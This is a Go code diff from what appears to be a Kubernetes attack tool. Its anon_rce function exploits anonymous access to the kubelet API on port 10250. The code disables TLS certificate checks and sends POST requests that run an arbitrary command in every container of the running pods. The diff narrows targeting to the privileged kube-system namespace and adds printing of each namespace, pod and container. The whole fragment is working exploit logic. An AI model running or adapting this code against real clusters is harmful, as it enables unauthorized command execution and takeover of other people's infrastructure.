@@ -45,15 +45,23 @@ func parse_pod(target string) *utils.RunningPods {
 
 func anon_rce(runpod *utils.RunningPods, target string) {
 	fmt.Printf("Trying anon RCE using '%s' for '%s'\n\n", utils.RceCommand, target)
+
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	for i := 0; i < len(runpod.Items); i++ {
 		found := false
+
 		for j := 0; j < len(runpod.Items[i].Spec.Containers); j++ {
 			namespace := runpod.Items[i].Metadata.Namespace
+
+			if namespace != "kube-system" {
+				continue
+			}
 			pod := runpod.Items[i].Metadata.Name
 			container := runpod.Items[i].Spec.Containers[j].Name
 			url := "https://" + target + ":10250/run/" + namespace + "/" + pod + "/" + container
 			method := "POST"
+
+			fmt.Printf("Namespace : '%s' \nPod : '%s' \nContainer : '%s' \n\n", namespace, pod, container)
 
 			payload := strings.NewReader("cmd=" + utils.RceCommand)
 
